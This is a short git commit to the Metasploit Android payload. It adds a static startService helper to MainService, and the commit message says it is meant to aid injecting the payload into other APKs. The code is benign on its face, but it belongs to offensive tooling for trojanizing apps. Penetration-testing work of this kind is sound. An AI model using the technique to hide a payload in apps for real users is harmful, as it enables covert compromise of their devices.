fbb12450c6c9a802ca671caf62ce170e043bc5a4
Tim <timrlw@gmail.com>
2016-09-26 16:48:11 +0800

    add static method to MainService to aid apk injection

--- java/androidpayload/app/src/com/metasploit/stage/MainService.java
+++ java/androidpayload/app/src/com/metasploit/stage/MainService.java
@@ -1,10 +1,16 @@
 package com.metasploit.stage;
 
+import android.app.ActivityManager;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 
 public class MainService extends Service {
+
+    public static void startService(Context context) {
+        context.startService(new Intent(context, MainService.class));
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
